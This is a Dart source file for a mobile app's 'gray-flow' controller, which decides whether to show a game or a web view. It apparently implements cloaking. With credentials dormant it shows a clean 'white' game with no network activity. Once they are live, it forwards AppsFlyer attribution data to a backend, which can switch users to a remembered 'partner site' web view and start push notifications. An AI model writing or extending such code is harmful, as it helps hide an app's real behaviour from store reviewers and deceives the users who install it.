// ===================================================================
// BeaconHelm — orchestrates the gray-flow decision.
//
// Single entry point: `decide()`. Guaranteed to return within the hold
// configured in FabricPlan — if backend / credentials are missing we
// return GameHarbor so the user always sees the white game within a
// predictable time.
// ===================================================================

import 'dart:async';

import '../../prism/diag.dart';
import '../plan/fabric_plan.dart';
import '../current/anchor_vault.dart';
import '../current/chime_bridge.dart';
import '../current/decree_fetch.dart';
import '../current/mesh_telemetry.dart';
import '../current/mooring_note.dart';
import '../current/tide_scout.dart';
import 'harbor.dart';

class BeaconHelm {
  BeaconHelm._();
  static final BeaconHelm instance = BeaconHelm._();

  /// Compute what the UI should show next.
  Future<Harbor> decide() async {
    diag('BeaconHelm',
        'decide() enter credentialsLive=$fabricCredentialsLive');
    // Dormant gate → always game. No network calls, no attribution SDK,
    // no notification channels created. White build.
    if (!fabricCredentialsLive) {
      diag('BeaconHelm', 'decide() → GameHarbor (gate dormant)');
      return const GameHarbor(mark: TrailMark.firstBoot);
    }

    // Early-boot URL (push cold-boot or deep link) wins immediately.
    final early = MooringNote.instance.takeUrl();
    if (early != null && early.startsWith('http')) {
      diag('BeaconHelm', 'decide() → WebHarbor via mooringNote url=$early');
      await AnchorVault.instance.rememberDecree(openWeb: true, url: early);
      return WebHarbor(
        url: early,
        mark: TrailMark.pushRelaunch,
      );
    }

    // Reach probe. If offline → Becalmed (don't try to fetch).
    final reachable = await TideScout.instance.isReachable();
    diag('BeaconHelm', 'reach probe reachable=$reachable');
    if (!reachable) {
      return const BecalmedHarbor(mark: TrailMark.reachLost);
    }

    final isFirst = await AnchorVault.instance.isFirstBoot();
    diag('BeaconHelm', 'isFirstBoot=$isFirst');

    // Returning user with a cached web decision → fast re-use.
    if (!isFirst) {
      final cached = await AnchorVault.instance.recallDecree();
      diag('BeaconHelm',
          'cached decree openWeb=${cached.openWeb} url=${cached.url}');
      if (cached.openWeb == true && cached.url != null) {
        return WebHarbor(
          url: cached.url!,
          mark: TrailMark.cachedWebReturn,
        );
      }
      if (cached.openWeb == false) {
        return const GameHarbor(mark: TrailMark.cachedGameReturn);
      }
    }

    // Fresh decision path. Wait for the AppsFlyer install + deep-link
    // callbacks together, then forward their full payloads to the
    // backend so the partner site sees every sub_id / deep_link_*.
    final breadcrumbs =
        await MeshTelemetry.instance.awaitBreadcrumbs(isFirstLaunch: isFirst);
    final postTimeout = isFirst
        ? FabricPlan.firstInstallDispatch
        : FabricPlan.decreeDispatch;

    diag('BeaconHelm',
        'about to POST isFirst=$isFirst timeout=${postTimeout.inSeconds}s '
        'media_source=${breadcrumbs['media_source']} '
        'af_status=${breadcrumbs['af_status']} '
        'campaign_id=${breadcrumbs['campaign_id']} '
        'af_id=${breadcrumbs['af_id']} '
        'deep_link_value=${breadcrumbs['deep_link_value']}');

    Decree? decree;
    try {
      decree = await DecreeFetch.instance
          .ask(isFirstLaunch: isFirst, breadcrumbs: breadcrumbs)
          .timeout(postTimeout);
    } on TimeoutException {
      diag('BeaconHelm', 'DecreeFetch TIMEOUT after ${postTimeout.inSeconds}s');
      decree = null;
    } catch (e, st) {
      diag('BeaconHelm', 'DecreeFetch EXCEPTION $e\n$st');
      decree = null;
    }

    diag('BeaconHelm',
        'decree openWeb=${decree?.openWeb} url=${decree?.url} valid=${decree?.valid}');

    await AnchorVault.instance.markBooted();

    if (decree == null || !decree.valid) {
      diag('BeaconHelm', 'FINAL → GameHarbor (no valid decree)');
      return const GameHarbor(mark: TrailMark.firstBoot);
    }
    if (!decree.openWeb) {
      diag('BeaconHelm', 'FINAL → GameHarbor (decree says game)');
      return const GameHarbor(mark: TrailMark.firstBoot);
    }

    // Prime chime channel exactly once (after we know we are showing web).
    unawaited(ChimeBridge.instance.boot());
    diag('BeaconHelm', 'FINAL → WebHarbor url=${decree.url}');
    return WebHarbor(
      url: decree.url!,
      mark: TrailMark.firstBoot,
    );
  }
}
